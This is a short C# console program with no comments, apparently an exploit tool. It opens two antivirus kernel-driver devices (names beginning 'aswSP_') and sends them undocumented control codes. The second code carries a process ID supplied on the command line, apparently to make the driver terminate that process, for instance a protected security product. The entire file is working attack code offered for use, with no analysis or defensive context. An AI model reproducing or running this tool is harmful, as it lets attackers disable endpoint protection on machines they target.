using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DeviceIoControl(
        IntPtr hDevice,
        uint dwIoControlCode,
        IntPtr lpInBuffer,
        uint nInBufferSize,
        IntPtr lpOutBuffer,
        uint nOutBufferSize,
        out uint lpBytesReturned,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint OPEN_EXISTING = 3;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;

    private const uint IOCTL_FIRST_CODE = 0x7299c004;
    private const uint IOCTL_SECOND_CODE = 0x9988c094;

    static void Main(string[] args)
    {
        if (args.Length != 1 || args[0] == "-h")
        {
            Console.WriteLine("./device.exe pid");
            return;
        }

        string volumeName1 = @"\\.\aswSP_ArPot2";
        IntPtr hVolume1 = CreateFile(volumeName1, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

        if (hVolume1 == IntPtr.Zero || hVolume1 == new IntPtr(-1))
        {
            Console.WriteLine("Failed to open device 1. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        uint bytesReturned;
        if (!DeviceIoControl(hVolume1, IOCTL_FIRST_CODE, IntPtr.Zero, 4, IntPtr.Zero, 0, out bytesReturned, IntPtr.Zero))
        {
            Console.WriteLine("DeviceIoControl failed for device 1. Error: " + Marshal.GetLastWin32Error());
        }

        CloseHandle(hVolume1);

        string volumeName2 = @"\\.\aswSP_Avar";
        IntPtr hVolume2 = CreateFile(volumeName2, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

        if (hVolume2 == IntPtr.Zero || hVolume2 == new IntPtr(-1))
        {
            Console.WriteLine("Failed to open device 2. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        int pid = int.Parse(args[0]);
        IntPtr inBuffer = Marshal.AllocHGlobal(sizeof(int));
        Marshal.WriteInt32(inBuffer, pid);

        if (!DeviceIoControl(hVolume2, IOCTL_SECOND_CODE, inBuffer, 4, IntPtr.Zero, 0, out bytesReturned, IntPtr.Zero))
        {
            Console.WriteLine("DeviceIoControl failed for device 2. Error: " + Marshal.GetLastWin32Error());
        }

        Marshal.FreeHGlobal(inBuffer);
        CloseHandle(hVolume2);
    }
}
